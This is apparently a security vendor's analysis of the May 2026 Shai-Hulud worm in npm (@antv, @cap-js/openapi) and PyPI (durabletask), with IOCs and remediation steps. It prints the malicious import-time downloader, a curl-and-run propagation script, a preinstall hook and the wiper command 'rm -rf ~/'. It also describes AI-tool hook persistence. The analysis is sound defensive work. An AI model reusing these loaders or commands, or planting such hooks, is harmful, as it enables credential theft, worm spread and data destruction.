---
excerpt: "JFrog Security Research analyzed the May 19 Shai-Hulud wave across npm and PyPI, where compromised packages used install-time and import-time execution, encrypted credential theft, GitHub dead-drop exfiltration, AI-tool persistence, npm OIDC abuse, lateral movement through AWS SSM and Kubernetes, and an evolved dead-man switch."
title: "Shai-Hulud Returns: npm Worm hits @antv in latest ongoing campaign"
date: "May 19, 2026"
description: "Guy Korolevski, JFrog Security Researcher"
tag: "Real Time Post"
img: /img/RealTimePostImage/post/shai-hulud-here-we-go-again-may19/image1.jpg
type: realTimePost
minutes: '14'
---


![](/img/RealTimePostImage/post/shai-hulud-here-we-go-again-may19/image1.jpg)

**Update, May 19, 2026:** Following initial publication, JFrog Security Research identified an additional compromised package, `@cap-js/openapi` 1.4.1, carrying a closely related Shai-Hulud payload variant that uses a distinct indirect delivery technique. See [A Related Variant: @cap-js/openapi](#a-related-variant-cap-jsopenapi) below.

**Second update, May 19, 2026:** JFrog Security Research also identified compromised PyPI package `durabletask` versions 1.4.1, 1.4.2, and 1.4.3. The package uses an import-time Linux loader to fetch `rope.pyz`, a direct evolution of the Python `transformers.pyz` payload analyzed in our previous post, but adds lateral movement through AWS Systems Manager and Kubernetes. See [PyPI Payload: durabletask Import-Time Loader](#pypi-payload-durabletask-import-time-loader) below.

JFrog Security Research analyzed a new **Shai-Hulud: Here We Go Again** wave affecting the npm ecosystem on May 19, 2026, with a related PyPI compromise identified during follow-up analysis. The campaign compromised hundreds of package versions around the `@antv` ecosystem and related packages, using malicious install-time execution to steal credentials from developer machines, CI/CD runners, cloud environments, and local developer tooling.

This was initially a compromise of 323, now 325 legitimate npm packages, not a fake-package campaign. The npm maintainer account `atool` (`i@hust.cc`), which owns 547 packages including the `@antv` data visualization suite, was compromised through stolen publishing credentials. A second maintainer account, `prop`, was also compromised and published six packages as part of the same campaign. The later PyPI finding shows the same campaign family also reaching Python users through the legitimate `durabletask` package.

This post follows JFrog's previous analysis of [Shai-Hulud: Here We Go Again](https://research.jfrog.com/post/shai-hulud-here-we-go-again/). The earlier wave already showed worm-like npm propagation, PyPI import-time payload delivery, GitHub dead-drop exfiltration, and a destructive token monitor. The May 19 wave keeps those core behaviors, but changes the npm delivery path, adds a smaller Bun-based payload, expands persistence through AI-tool hooks, introduces an additional GitHub commit-search C2 daemon that can survive token rotation, and evolves the PyPI payload with lateral movement through cloud and Kubernetes control planes.

## Install-Time Delivery Through npm

Analysis of a compromised package sample confirms the core delivery pattern described for the broader wave. The package keeps its legitimate library code in place as cover, but adds a root-level obfuscated `index.js` payload of roughly 499 KB. Execution is triggered before installation finishes through an npm lifecycle hook:

```json
{
  "scripts": {
    "preinstall": "bun run index.js"
  },
  "dependencies": {
    "bun": "^1.3.13"
  },
  "optionalDependencies": {
    "@antv/setup": "github:antvis/G2#1916faa365f2788b6e193514872d51a242876569"
  }
}
```

The `preinstall` hook launches the payload using Bun. Adding Bun as a production dependency is a strong package-level indicator because the legitimate library does not require it. The `optionalDependencies` entry points to a pinned GitHub commit, giving the attacker a second install-time execution path through npm's handling of GitHub dependencies and lifecycle scripts.

Once launched, the payload daemonizes itself by spawning a detached background copy and exiting the foreground process. This allows the installation to appear normal while the credential collection and persistence logic continues to run.

## Obfuscation And Credential Collection

The payload is a single-line, heavily obfuscated Bun bundle. Deobfuscation of the analyzed sample confirmed a custom string decryption layer using PBKDF2-SHA256, XOR-based decoding, and runtime access through `globalThis.f2959c600`. Sensitive strings such as file paths, commands, API endpoints, and public keys are decrypted only during execution.

The collectors are broad and clearly designed for both developer workstations and build infrastructure. The analyzed payload reads local credential files, captures the shell environment, runs `gh auth token` to recover GitHub CLI credentials, and searches for token patterns in files. It also includes dedicated collectors for AWS, Kubernetes, HashiCorp Vault, password managers, GitHub repository secrets, and GitHub Actions runner memory.

The GitHub Actions memory collector is one of the most important capabilities. When running on a Linux GitHub Actions runner, the malware looks for a `Runner.Worker` process and extracts serialized secret values marked with `"isSecret":true`. This bypasses log masking entirely because the payload reads the runner process memory, not workflow logs.

Targeted data includes:

- GitHub tokens, GitHub CLI tokens, GitHub Actions secrets, and OIDC request material.  
- npm tokens and npm trusted-publishing credentials minted through OIDC exchange.  
- AWS environment credentials, shared credential files, EC2 IMDSv2 credentials, ECS task role credentials, Secrets Manager values, and SSM Parameter Store values.  
- Kubernetes service account tokens, kubeconfig entries, and Kubernetes secrets across accessible namespaces.  
- HashiCorp Vault tokens and reachable KV secrets.  
- SSH keys, Docker credentials, shell histories, `.env` files, `.npmrc`, `.pypirc`, `.netrc`, Git credentials, and generic API keys.

## Exfiltration Through Encrypted Channels

Our analysis confirms that collected data is serialized, compressed, encrypted with AES-256-GCM, and wrapped with RSA before exfiltration. Only the attacker-controlled RSA private key can decrypt the resulting envelope.

The May 19 wave uses redundant exfiltration paths. The payload uses a  direct HTTPS endpoint at `hxxps[:]//t[.]m-kosche[.]com:443/api/public/otel/v1/traces`, a path shaped to resemble an OpenTelemetry collector endpoint. If the direct channel is unavailable and a stolen GitHub token has sufficient permissions, the payload falls back to creating a public GitHub repository under the victim account and committing encrypted result files under `results/`.

In this wave, the GitHub dead-drop repository description is reversed as `niagA oG eW ereH :duluH-iahS`, which decodes to `Shai-Hulud: Here We Go Again`. The payload writes result batches using the Git Data API, creating blobs, trees, commits, and ref updates. When a stolen token is included in the exfiltration flow, the commit message can include the threat string `IfYouInvalidateThisTokenItWillNukeTheComputerOfTheOwner`.

![](/img/RealTimePostImage/post/shai-hulud-here-we-go-again-may19/image2.png)
This GitHub-based exfiltration model is especially dangerous in CI/CD environments because outbound access to GitHub is commonly allowed. Blocking only attacker-owned infrastructure is not sufficient when the malware can use legitimate developer platforms as storage and command channels.

## What Changed Since The Last Campaign

[The previous “Here We Go Again” campaign](https://research.jfrog.com/post/shai-hulud-here-we-go-again/), also analyzed by JFrog, was a Shai-Hulud wave with npm and PyPI components, worm-like package propagation, encrypted exfiltration, and a destructive `gh-token-monitor` dead-man switch. The May 19 wave preserves those fundamentals but changes several operational details.

| Area | Previous wave described by JFrog | May 19 wave |
| :---- | :---- | :---- |
| npm execution | Loader-driven Bun execution with a larger JavaScript payload | Direct `preinstall` execution of `index.js`, roughly 499 KB |
| Package metadata | Lifecycle script plus package-specific setup dependency | `preinstall`, Bun dependency, and `@antv/setup` GitHub optional dependency |
| GitHub exfiltration | Public repositories with a plain campaign description | Public repositories with the campaign description reversed |
| Direct C2 | Session/Oxen-style file upload path | Fake OpenTelemetry endpoint at `t[.]m-kosche[.]com` |
| Dead-man switch | `gh-token-monitor` tied to token invalidation | `gh-token-monitor` plus a new `kitty-monitor` GitHub commit-search C2 |
| Persistence | OS-level token monitor and developer-tool hooks | Expanded AI-tool hook injection, workflow injection, and `kitty-monitor` daemon |
| Provenance abuse | Trusted-publishing and OIDC abuse were part of the campaign model | OIDC-to-npm token exchange and Sigstore provenance creation are confirmed in the payload logic |

The key lesson is unchanged: provenance can prove where a package was built, but not whether the build environment was compromised. If malware runs inside a trusted workflow, it can mint legitimate-looking publishing credentials and produce packages that appear valid at the provenance layer.

## The Dead-Man Switch

Similarly to the last campaign, the most important remediation detail is the destructive token monitor. The analyzed sample confirms that when GitHub repo exfiltration is used, the payload can install a bash-based monitor that polls `hxxps[:]//api[.]github[.]com/user` with a stolen GitHub token. If the token becomes invalid, the handler command can execute `rm -rf ~/; rm -rf ~/Documents`.

This behavior is a direct continuation of the dead-man switch described in JFrog's previous Shai-Hulud analysis, where the warning string was `IfYouRevokeThisTokenItWillWipeTheComputerOfTheOwner`. In the May 19 wave, the threat string appears as `IfYouInvalidateThisTokenItWillNukeTheComputerOfTheOwner`.

This changes the normal incident-response order. Revoking GitHub tokens first may trigger destructive behavior on infected machines. Affected systems should be isolated from the network, persistence should be stopped and removed, and only then should exposed GitHub tokens and related credentials be revoked.

The May 19 wave also adds `kitty-monitor`, a persistent GitHub commit-search C2 daemon. It polls GitHub commit search for the keyword `firedalazer`, validates commands with an embedded RSA public key, downloads the referenced payload, and executes it as Python. This mechanism does not depend on the stolen GitHub token remaining valid, so token rotation alone does not neutralize an infected host.

## Persistence And Propagation

The payload contains several persistence mechanisms beyond the token monitor. It copies itself into `~/.claude/package/` and `~/.codex/package/`, then searches for Claude Code and Codex settings files and injects `SessionStart` hooks. This causes the payload to execute again when a new AI-tool session starts. It can also add a VS Code `folderOpen` task, causing execution when a repository folder is opened.

In GitHub Actions environments, the payload can commit malicious files back to accessible repositories and inject workflow files designed to expose repository secrets. The campaign notes describe a workflow named `Run Copilot` under `.github/workflows/codeql.yml`, with a branch named `chore/add-codeql-static-analysis` and commit message `fix: ci`.

The worm propagation path is also present. The payload includes logic to request an npm OIDC token using `ACTIONS_ID_TOKEN_REQUEST_TOKEN` and `ACTIONS_ID_TOKEN_REQUEST_URL`, exchange it at the npm registry endpoint, modify package tarballs, and republish infected versions. This allows a compromised CI environment to become a publishing point for additional compromised packages.

## PyPI Payload: `durabletask` Import-Time Loader

After analyzing the npm wave, we identified a related PyPI compromise affecting the legitimate package `durabletask`. Versions 1.4.1, 1.4.2, and 1.4.3 had a Linux-only downloader appended to the package's `__init__.py`. Unlike the npm packages, which rely on lifecycle scripts, this payload can execute when Python code imports `durabletask`.

```python
if platform.system() == "Linux":
    try:
        urllib.request.urlretrieve("hxxps[:]//check.git-service[.]com/rope.pyz", "/tmp/managed.pyz")
        with open(os.devnull, "w") as f:
            subprocess.Popen(
                ["python3", "/tmp/managed.pyz"],
                stdout=f,
                stderr=f,
                stdin=f,
                start_new_session=True,
            )
    except:
        pass
```

The loader silently downloads `rope.pyz` or `managed.pyz` (depends on the version) from `check.git-service[.]com`, writes it to `/tmp/managed.pyz`, and starts it as a detached Python process with all standard streams redirected to `/dev/null`. The Linux guard mirrors the targeting gate inside the downloaded payload, reducing noise on non-target systems.

The downloaded Python application is not a new family. **It is a direct evolution** of the `transformers.pyz` payload described in our previous analysis of [Shai-Hulud: Here We Go Again](https://research.jfrog.com/post/shai-hulud-here-we-go-again/). Several core files are **byte-for-byte identical**, including `__main__.py`, `aggregate.py`, `entrypoint.py`, `roulette.py`, `collectors/filesystem.py`, `collectors/gcp.py`, `collectors/azure.py`, `collectors/vault.py`, and `utilities/crypto.py`. For the shared anti-analysis checks, credential collectors, encrypted exfiltration chain, GitHub fallback, and geofenced destructive behavior, refer to the previous post. The important change in the `durabletask` payload is that the same stealer now includes active lateral movement and stronger password-manager access attempts.

### Lateral Movement Through AWS SSM

The AWS collector still gathers AWS secrets and SSM parameters, but now also enumerates EC2 instances managed by AWS Systems Manager across 19 regions using `DescribeInstanceInformation`. For each discovered instance, it records identifiers and status fields such as `InstanceId`, `PingStatus`, `PlatformType`, `ComputerName`, and `IPAddress`.

When SSM-managed instances are found, the payload attempts to propagate to up to five online, non-Windows targets. It resolves AWS credentials from the environment or EC2 IMDS, skips systems already marked with `~/.cache/.sys-update-check`, and sends an `AWS-RunShellScript` command that downloads and runs the same Python zip payload:

```bash
[ -f "$HOME/.cache/.sys-update-check" ] && exit 0
PAYLOAD_FILE="rope-${RANDOM}.pyz"
curl -sSL "hxxps[:]//check.git-service[.]com/rope.pyz" -o "$PAYLOAD_FILE" \
  || curl -sSL "hxxps[:]//t[.]m-kosche[.]com/rope.pyz" -o "$PAYLOAD_FILE"
nohup python3 "$PAYLOAD_FILE" > /dev/null 2>&1 &
```

The propagation state is written under `/tmp/.rope_state/ssm_instances.json`, while the per-host marker contains a machine fingerprint derived from host identity files and hostname values. This is a meaningful escalation from the earlier PyPI payload: the malware no longer only steals cloud credentials, it uses them to reach additional machines through legitimate cloud administration channels.

### Lateral Movement Through Kubernetes

The Kubernetes collector was also extended from passive collection to propagation. After extracting Kubernetes secrets, the payload attempts to list running pods across all namespaces with `kubectl get pods --all-namespaces -o json`. It then uses `kubectl exec` against up to five pods, excluding the current pod identified by `$HOSTNAME`, and runs the same download-and-execute script used by the SSM path.

A separate marker, `~/.cache/.sys-update-check-k8s`, prevents repeated Kubernetes propagation from the same environment. This means a compromised Python import inside a pod or developer environment with cluster access can become a launch point into other workloads, provided the available Kubernetes identity has sufficient `exec` permissions.

### Active Password-Manager Unlocking

The earlier Python payload attempted to dump password-manager data when vaults were already unlocked. The `durabletask` payload goes further by attempting to unlock them first. It scrapes candidate passwords from environment variables matching patterns such as `*PASS*`, `*SECRET*`, `*KEY*`, `BW_*`, and `OP_*`, then also searches shell history files including `~/.bash_history`, `~/.zsh_history`, and `~/.history`.

Those candidates, plus the fallback string `anon`, are tried against Bitwarden through `bw unlock <password> --raw`, 1Password through `op signin --raw`, and `pass` or `gopass` through GPG unlock attempts. If an unlock succeeds, the payload proceeds with the same vault-dumping behavior documented in the previous PyPI analysis.

### Infrastructure Changes

The `durabletask` payload also changes the network infrastructure used by the earlier Python stealer. The original PyPI payload used the raw IP `83[.]142[.]209[.]194`, disabled TLS verification, and posted stolen data to `/v1/weights`. The new payload moves to `check.git-service[.]com`, enables TLS verification, posts encrypted results to `/api/public/version`, and keeps `/v1/models` as the roulette endpoint for secondary payload retrieval. Propagation uses `hxxps[:]//check.git-service[.]com/rope.pyz` with `hxxps[:]//t[.]m-kosche[.]com/rope.pyz` as a fallback payload URL.

## A Related Variant: `@cap-js/openapi`

After initial publication, JFrog Security Research identified `@cap-js/openapi` 1.4.1 as another compromised package in this campaign. `@cap-js/openapi` is a legitimate SAP open-source tool for generating OpenAPI documents from CAP service definitions, with its canonical repository at `github:cap-js/openapi`. The malicious version 1.4.1 introduces a structural change to the delivery mechanism not seen in the main wave: the package itself contains no malicious code at all. Instead, the payload is delivered entirely through an `optionalDependencies` entry:

```json
{
  "optionalDependencies": {
    "@sap/setup": "github:cap-js/openapi#d78c25443ec4a0d7f0a85776461f3b1163132537"
  }
}
```

When a developer installs `@cap-js/openapi` 1.4.1, npm resolves this optional dependency, fetches the attacker-controlled GitHub commit, and runs the lifecycle scripts embedded in that fetched package. The malicious `index.js` never appears as a suspicious file inside the installed npm package tarball itself, reducing the chance that a direct tarball inspection will surface the threat. The naming pattern `@sap/setup` mirrors the `@antv/setup` name used in the main wave, pointing to the same author behind both deployments.

![](/img/RealTimePostImage/post/shai-hulud-here-we-go-again-may19/image5.png)

Notably, commit `d78c25443ec4a0d7f0a85776461f3b1163132537` does not belong to any branch in the `cap-js/openapi` repository and likely originates from a fork outside of it. GitHub still resolves and serves commit SHAs from forks when referenced through the parent repository's URL, which means npm happily fetches the attacker's fork content while the reference appears to point at the legitimate `cap-js/openapi` repository. This makes the dependency entry look far less suspicious to a casual reviewer.

The payload at that commit (`index.js`, SHA-256: `7c24b4d9a8f448832f3752d7f67dcdbf1b7f0f41e10bf633efa175e627144e8b`) is a re-obfuscated instance of the same Shai-Hulud bundle. The core credential collection, AES-256-GCM exfiltration, persistence logic, and C2 endpoint at `hxxps[:]//t[.]m-kosche[.]com` are structurally identical to the main wave samples — all capabilities described in this analysis apply equally to this variant. The primary functional difference is in the C2 dead-drop keywords: where the main wave's `kitty-monitor` polls GitHub commit search for `firedalazer`, this variant polls for `thebeautifulsnadsoftime` (sic) and `thebeautifulmarchoftime`. Using distinct keywords per deployment allows the attacker to address different infected populations with separate follow-on commands without cross-contamination between victim cohorts.

This delivery-by-optional-dependency approach widens the attacker's surface beyond what direct payload embedding requires. Any compromised package that adds a single `optionalDependencies` line pointing to an attacker-controlled GitHub commit becomes a delivery vehicle, and the npm package tarball itself remains clean by any static inspection that stops at the package boundary.

## How did JFrog Curation protect against this attack?

JFrog Curation customers using an immaturity policy were fully protected from this attack, as all of the hijacked packages were flagged in less than 24 hours. Curation has automatic compliance version selection (CVS) mechanism to ensure developer and CI/CD seamless fallback to compliant (non-malicious) versions.

The full, updated list of relevant packages in this campaign is also available through the JFrog Catalog label \- “Shai-Hulud: Here We Go Again \- May 19”

![](/img/RealTimePostImage/post/shai-hulud-here-we-go-again-may19/image3.png)

## How can JFrog Xray customers check if they are affected?

Xray customers can check if any of their artifacts is affected by using [Impact Search](https://jfrog.com/help/r/search-artifacts-by-cve-or-component/how-to-search-for-impacted-resources) with the relevant XRAY-IDs (see Appendix A) and by searching for the PyPI package/version indicators in Appendix B.

![](/img/RealTimePostImage/post/shai-hulud-here-we-go-again-may19/image4.png)

## Remediation

### PyPI Payload Remediation

- Identify Python environments, lockfiles, container images, and build logs that installed `durabletask` versions 1.4.1, 1.4.2, or 1.4.3.
- Remove the compromised package version with `pip uninstall durabletask`, reinstall a verified clean version if required, and inspect `durabletask/__init__.py` for downloader code referencing `check.git-service[.]com/rope.pyz`.
- Treat affected Linux hosts as compromised. Remove `/tmp/managed.pyz`, `/tmp/rope-*.pyz`, `~/.cache/.sys-update-check`, `~/.cache/.sys-update-check-k8s`, and `/tmp/.rope_state/ssm_instances.json` where present.
- Stop and disable `pgsql-monitor.service` if present with `systemctl stop pgsql-monitor.service`, `systemctl disable pgsql-monitor.service`, `systemctl --user stop pgsql-monitor.service`, and `systemctl --user disable pgsql-monitor.service`.
- Remove PyPI payload persistence artifacts: `~/.config/systemd/user/pgsql-monitor.service`, `/etc/systemd/system/pgsql-monitor.service`, `~/.local/bin/pgmonitor.py`, and `/usr/bin/pgmonitor.py`.
- Audit AWS CloudTrail and SSM history for suspicious `DescribeInstanceInformation` and `SendCommand` activity using `AWS-RunShellScript`, especially commands that download `rope.pyz`.
- Audit Kubernetes API logs for unexpected `kubectl exec` or pod `exec` activity across namespaces, especially from identities that should only read secrets or metadata.

### npm Payload Remediation

- Isolate affected developer machines and CI/CD runners before revoking GitHub tokens. This is the critical first step because token invalidation can trigger the npm dead-man switch.
- Identify affected npm projects by checking Appendix A, then searching lockfiles and package manifests for unexpected `preinstall` entries running `bun run index.js`, Bun added as a production dependency, `optionalDependencies` pointing to `github:antvis/G2#1916faa365f2788b6e193514872d51a242876569`, or `optionalDependencies` pointing to `github:cap-js/openapi#d78c25443ec4a0d7f0a85776461f3b1163132537`.
- Remove malicious npm package versions with `npm uninstall <package name>`, reinstall verified clean versions, and regenerate lockfiles from trusted package metadata.
- Stop and disable the Linux `gh-token-monitor` service before credential revocation: `systemctl --user stop gh-token-monitor.service` and `systemctl --user disable gh-token-monitor.service`.
- Remove Linux `gh-token-monitor` artifacts: `~/.config/systemd/user/gh-token-monitor.service`, `~/.local/bin/gh-token-monitor.sh`, and `~/.config/gh-token-monitor/`.
- Stop and disable the Linux `kitty-monitor` service: `systemctl --user stop kitty-monitor.service` and `systemctl --user disable kitty-monitor.service`.
- Remove Linux `kitty-monitor` artifacts: `~/.config/systemd/user/kitty-monitor.service`, `~/.local/share/kitty/cat.py`, and `/var/tmp/.gh_update_state`.
- On macOS, unload `gh-token-monitor` with `launchctl bootout "gui/$(id -u)" ~/Library/LaunchAgents/com.user.gh-token-monitor.plist`, then remove `~/Library/LaunchAgents/com.user.gh-token-monitor.plist`, `~/.local/bin/gh-token-monitor.sh`, and `~/.config/gh-token-monitor/`.
- On macOS, unload `kitty-monitor` with `launchctl bootout "gui/$(id -u)" ~/Library/LaunchAgents/com.user.kitty-monitor.plist`, then remove `~/Library/LaunchAgents/com.user.kitty-monitor.plist` and `~/.local/share/kitty/cat.py`.
- Remove AI-tool persistence artifacts, including `~/.claude/package/index.js`, `~/.codex/package/index.js`, injected `.claude/settings.json` `SessionStart` hooks, `.vscode/tasks.json` `folderOpen` tasks, `.claude/setup.mjs`, and `.vscode/setup.mjs`.
- Review GitHub repositories for unexpected workflow files such as `.github/workflows/codeql.yml`, the branch `chore/add-codeql-static-analysis`, commits with message `fix: ci`, suspicious commits authored as `claude@users.noreply.github.com`, and public repositories with the description `niagA oG eW ereH :duluH-iahS`.

### General Remediation

- **After persistence removal is verified**, rotate GitHub tokens, npm tokens, PyPI tokens, GitHub Actions secrets, npm trusted-publishing identities, AWS credentials, Kubernetes service account tokens, Vault tokens, SSH keys, Docker credentials, password-manager credentials, and any secrets present in affected environments.
- Audit npm and PyPI packages that affected identities can publish. Look for unexpected versions published after exposure, unexpected lifecycle scripts, new large payload files, import-time downloaders, and newly added GitHub-based optional dependencies.
- Do not treat valid Sigstore provenance as sufficient proof of legitimacy for packages published during the exposure window. The payload can use a compromised trusted workflow identity to produce valid-looking provenance.
- Rebuild affected developer machines, CI/CD runners, containers, and cloud workloads from clean images, and clear poisoned build caches.
- Consider using `npm ci --ignore-scripts` in CI where lifecycle scripts are not required, and enforce immaturity or quarantine policies for newly published package versions.
- Block campaign network indicators where possible, but do not rely on network blocking alone because GitHub API access, AWS SSM, and Kubernetes control-plane access are also used for exfiltration, C2, and propagation.

## Conclusions

The May 19 Shai-Hulud wave is not just another malicious package incident. The npm payload continues the campaign's install-time credential theft and package propagation model, while the PyPI `durabletask` payload shows the Python branch evolving from a downloader and stealer into a lateral-movement tool for cloud and Kubernetes environments. The ongoing waves of Shai-Hulud payloads are still in progress, and we can expect to see more of them in the near future.

The biggest operational risk is the remediation trap created by the dead-man switch, as in the previous attack. Defenders usually revoke exposed tokens as fast as possible, but in this case GitHub token revocation can trigger destructive local commands if the monitor is still active. The correct order is host isolation, persistence removal, and then credential rotation.

These malicious packages are detected by JFrog Xray and JFrog Curation.

## IOCs

### PyPI IOCs

- `durabletask` (PyPI) - versions 1.4.1, 1.4.2, and 1.4.3.
- `hxxps[:]//check.git-service[.]com/rope.pyz` - primary PyPI payload and propagation payload URL.
- `hxxps[:]//t[.]m-kosche[.]com/rope.pyz` - fallback PyPI propagation payload URL.
- `hxxps[:]//check.git-service[.]com/api/public/version` - PyPI encrypted exfiltration endpoint.
- `hxxps[:]//check.git-service[.]com/v1/models` - PyPI roulette endpoint for secondary payload retrieval.
- `hxxps[:]//check.git-service[.]com/audio.mp3` - PyPI destructive second-stage media URL.
- `hxxps[:]//api[.]github[.]com/search/commits?q=FIRESCALE` - PyPI fallback C2 discovery through signed GitHub commit messages.
- `/tmp/managed.pyz` - downloaded PyPI payload path used by the `durabletask` loader.
- `/tmp/rope-*.pyz` - temporary propagation payload filename pattern.
- `~/.cache/.sys-update-check` - AWS SSM propagation marker.
- `~/.cache/.sys-update-check-k8s` - Kubernetes propagation marker.
- `/tmp/.rope_state/ssm_instances.json` - AWS SSM discovery and propagation state.
- `pgsql-monitor.service` - PyPI second-stage persistence service.
- `~/.config/systemd/user/pgsql-monitor.service` - user-level PyPI persistence service path.
- `/etc/systemd/system/pgsql-monitor.service` - system-level PyPI persistence service path.
- `~/.local/bin/pgmonitor.py` - user-level PyPI second-stage persistence payload.
- `/usr/bin/pgmonitor.py` - system-level PyPI second-stage persistence payload.
- `PUSH UR T3MPRR` - PyPI GitHub exfiltration repository description.
- `FIRESCALE` - PyPI fallback C2 keyword used in GitHub commit search.
- `AWS-RunShellScript` - AWS SSM document used for PyPI lateral movement.
- `DescribeInstanceInformation` and `SendCommand` - AWS SSM API actions used during PyPI discovery and propagation.
- `he_IL`, `fa_IR`, `Jerusalem`, `Tel_Aviv`, and `Tehran` - geotargeting markers associated with destructive PyPI behavior.

### NPM IOCs

- See Appendix A for the full npm package and version list.
- `@cap-js/openapi` (npm) - XRAY-986402 - version 1.4.1.
- `hxxps[:]//t[.]m-kosche[.]com` - attacker's C2.
- `hxxps[:]//t[.]m-kosche[.]com:443/api/public/otel/v1/traces` - direct HTTPS C2 endpoint disguised as an OpenTelemetry traces path.
- `hxxps[:]//api[.]github[.]com/search/commits?q=firedalazer` - `kitty-monitor` GitHub commit-search C2 polling.
- `hxxps[:]//fulcio[.]sigstore[.]dev/api/v2/signingCert` - Sigstore certificate issuance endpoint used during provenance generation.
- `hxxps[:]//rekor[.]sigstore[.]dev/api/v1/log/entries` - Rekor transparency log submission endpoint used during provenance generation.
- `github:antvis/G2#1916faa365f2788b6e193514872d51a242876569` - GitHub optional dependency used by npm payload delivery.
- `github:cap-js/openapi#d78c25443ec4a0d7f0a85776461f3b1163132537` - attacker-controlled GitHub commit delivering the `@cap-js/openapi` variant payload.
- `7c24b4d9a8f448832f3752d7f67dcdbf1b7f0f41e10bf633efa175e627144e8b` - SHA-256 of `index.js` from the `@cap-js/openapi` variant payload.
- `~/.config/systemd/user/gh-token-monitor.service` - Linux user service for the GitHub token dead-man switch.
- `~/.local/bin/gh-token-monitor.sh` - GitHub token monitor script.
- `~/.config/gh-token-monitor/` - GitHub token monitor configuration directory.
- `~/Library/LaunchAgents/com.user.gh-token-monitor.plist` - macOS LaunchAgent for the GitHub token dead-man switch.
- `~/.config/systemd/user/kitty-monitor.service` - Linux user service for the GitHub commit-search C2 daemon.
- `~/Library/LaunchAgents/com.user.kitty-monitor.plist` - macOS LaunchAgent for the GitHub commit-search C2 daemon.
- `~/.local/share/kitty/cat.py` - Python payload used by `kitty-monitor`.
- `/var/tmp/.gh_update_state` - `kitty-monitor` execution state tracking file.
- `~/.claude/package/index.js` - local payload copy used for AI-tool persistence.
- `~/.codex/package/index.js` - local payload copy used for AI-tool persistence.
- `niagA oG eW ereH :duluH-iahS` - reversed GitHub dead-drop repository description.
- `IfYouInvalidateThisTokenItWillNukeTheComputerOfTheOwner` - threat string associated with token invalidation.
- `firedalazer` - GitHub commit-search keyword used by `kitty-monitor` in the main wave.
- `thebeautifulsnadsoftime`, `thebeautifulmarchoftime` - GitHub commit-search keywords used by `kitty-monitor` in the `@cap-js/openapi` variant.

## Appendix A: NPM Compromised Package versions

Catalog customers \- see also “Shai-Hulud: Here We Go Again \- May 19” label

| Package Name | XrayID | Versions |
| :---- | :---- | :---- |
| @antv/a8 | XRAY-986161 | 0.1.1,0.2.1 |
| @antv/adjust | XRAY-986266 | 0.4.5,0.3.5 |
| @antv/algorithm | XRAY-986144 | 0.3.26,0.2.26 |
| @antv/async-hook | XRAY-986326 | 2.3.9,2.4.9 |
| @antv/attr | XRAY-986295 | 0.5.5,0.4.5 |
| @antv/ava | XRAY-986276 | 3.5.1,3.6.1 |
| @antv/ava-react | XRAY-986075 | 3.5.2,3.4.2 |
| @antv/awards | XRAY-986164 | 0.1.9,0.2.9 |
| @antv/calendar-heatmap | XRAY-986341 | 1.2.2,1.3.2 |
| @antv/chart-linter | XRAY-986268 | 1.3.6,1.2.6 |
| @antv/chart-node-g6 | XRAY-986078 | 0.1.4,0.2.4 |
| @antv/chart-visualization-skills | XRAY-986283 | 0.2.3,0.3.3 |
| @antv/ckb | XRAY-986358 | 2.1.4,2.2.4 |
| @antv/color-schema | XRAY-986201 | 0.3.3,0.4.3 |
| @antv/color-util | XRAY-986319 | 2.2.6,2.1.6 |
| @antv/component | XRAY-986381 | 2.3.11,2.2.11 |
| @antv/coord | XRAY-986377 | 0.5.7,0.6.7 |
| @antv/d3-color | XRAY-986112 | 1.1.0,1.2.0 |
| @antv/d3-interpolate | XRAY-986237 | 1.2.3,1.1.3 |
| @antv/data-samples | XRAY-986249 | 1.1.1,1.2.1 |
| @antv/data-set | XRAY-986289 | 0.12.8,0.13.8 |
| @antv/data-wizard | XRAY-986225 | 2.1.4,2.2.4 |
| @antv/dipper-component | XRAY-986371 | 0.1.4,0.2.4 |
| @antv/dipper-hooks | XRAY-986314 | 0.4.1,0.3.1 |
| @antv/dipper-map | XRAY-986209 | 1.1.10,1.2.10 |
| @antv/dom-util | XRAY-986214 | 2.1.4,2.2.4 |
| @antv/dumi-theme-antv | XRAY-986136 | 0.9.4,0.10.4 |
| @antv/dw-analyzer | XRAY-986366 | 1.3.5,1.2.5 |
| @antv/dw-random | XRAY-986110 | 1.2.7,1.3.7 |
| @antv/dw-transform | XRAY-986126 | 1.2.7,1.3.7 |
| @antv/dw-util | XRAY-986359 | 1.3.4,1.2.4 |
| @antv/event-emitter | XRAY-986165 | 0.3.3,0.2.3 |
| @antv/expr | XRAY-986113 | 1.2.2,1.1.2 |
| @antv/f-charts | XRAY-986100 | 0.2.0,0.1.0 |
| @antv/f-engine | XRAY-986293 | 1.12.0,1.11.0 |
| @antv/f-lottie | XRAY-986158 | 1.11.0,1.12.0 |
| @antv/f-my | XRAY-986339 | 1.12.0,1.11.0 |
| @antv/f-react | XRAY-986125 | 1.11.0,1.12.0 |
| @antv/f-test-utils | XRAY-986376 | 1.1.9,1.2.9 |
| @antv/f-vue | XRAY-986352 | 1.12.0,1.11.0 |
| @antv/f-wx | XRAY-986325 | 1.11.0,1.12.0 |
| @antv/f2 | XRAY-986301 | 5.15.0,5.16.0 |
| @antv/f2-algorithm | XRAY-986160 | 5.8.0,5.9.0 |
| @antv/f2-canvas | XRAY-986082 | 1.2.5,1.1.5 |
| @antv/f2-context | XRAY-986159 | 0.1.1,0.2.1 |
| @antv/f2-graphic | XRAY-986292 | 0.1.16,0.2.16 |
| @antv/f2-my | XRAY-986323 | 4.1.52,4.2.52 |
| @antv/f2-react | XRAY-986114 | 5.15.0,5.16.0 |
| @antv/f2-site | XRAY-986142 | 4.2.42,4.1.42 |
| @antv/f2-vue | XRAY-986071 | 4.1.33,4.2.33 |
| @antv/f2-wordcloud | XRAY-986343 | 5.15.0,5.16.0 |
| @antv/f2-wx | XRAY-986282 | 4.1.51,4.2.51 |
| @antv/f6 | XRAY-986166 | 0.2.19,0.1.19 |
| @antv/f6-alipay | XRAY-986111 | 0.1.7,0.2.7 |
| @antv/f6-core | XRAY-986129 | 0.1.2,0.2.2 |
| @antv/f6-element | XRAY-986303 | 0.1.1,0.2.1 |
| @antv/f6-hammerjs | XRAY-986193 | 0.1.2,0.2.2 |
| @antv/f6-plugin | XRAY-986187 | 1.2.6,1.1.6 |
| @antv/f6-ui | XRAY-986329 | 1.2.3,1.1.3 |
| @antv/f6-wx | XRAY-986202 | 0.1.7,0.2.7 |
| @antv/g | XRAY-986362 | 6.4.1,6.5.1 |
| @antv/g-base | XRAY-986167 | 0.7.16,0.6.16 |
| @antv/g-camera-api | XRAY-986153 | 2.2.45,2.1.45 |
